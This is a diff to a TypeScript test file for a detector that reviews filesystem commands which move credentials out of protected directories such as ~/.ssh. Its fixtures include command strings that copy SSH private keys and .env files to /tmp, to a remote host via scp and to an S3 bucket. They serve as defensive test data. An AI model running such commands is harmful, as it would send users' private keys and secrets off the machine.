@@ -276,6 +276,49 @@ describe('stage 4 — round 3', () => {
   });
 });
 
+// ─────────────────────────────────────────────────────────────────────────────
+// /code-review round 5 (2026-09-13): the in-jail DESTINATION guard was keyed on
+// the destination alone, so a destination that merely LOOKS jailed suppressed the
+// review while the real credential left the machine. `/tmp/.ssh/` matches the same
+// rule the real jail does, and the matcher cannot tell one from the other.
+//
+// The SOURCE decides now: no jailed source is an install, a jailed source going to
+// the SAME directory is a rename, and a jailed source going anywhere else is the
+// credential leaving.
+// ─────────────────────────────────────────────────────────────────────────────
+describe('a destination that only LOOKS jailed does not silence the review', () => {
+  const K2 = '/home/u/.ssh/id_rsa';
+  const D2 = '/home/u/.ssh';
+  const E2 = '/home/u/p/.env';
+  const verdict = (c: string) => {
+    const r = analyzeFsOperation(c);
+    return r ? r.verdict : 'null';
+  };
+
+  it.each([
+    [`cp ${K2} /tmp/.ssh/k`],
+    [`scp ${K2} user@host:/tmp/.ssh/`],
+    [`cp ${E2} /tmp/.env`],
+    [`mv ${K2} /tmp/.ssh/id_rsa`],
+    [`aws s3 cp ${K2} s3://b/.ssh/k`],
+  ])('%s is still a review', (c) => expect(verdict(c)).toBe('review'));
+
+  it.each([
+    [`cp /tmp/ci_key ${K2}`],
+    [`install -m 600 /tmp/k ${K2}`],
+    [`mv /tmp/ci_key ${D2}/id_rsa`],
+  ])('%s installs a key and stays quiet', (c) => expect(verdict(c)).toBe('null'));
+
+  it.each([[`mv ${K2} ${K2}.bak`], [`cp ${K2} ${D2}/id_rsa.bak`]])(
+    '%s renames inside the jail and stays quiet',
+    (c) => expect(verdict(c)).toBe('null')
+  );
+
+  it('extracting INTO the jail is still not a read', () => {
+    expect(verdict(`tar xzf /tmp/k.tgz -C ${D2}`)).toBe('null');
+  });
+});
+
 describe('stage 4 — non-goals, pinned as failing', () => {
   it.fails('a relative segment after tar -C escapes the rooted matcher', () => {
     expect(v(`tar cf /tmp/s.tar -C /home/u .ssh`)).toBe(COPY_SSH);
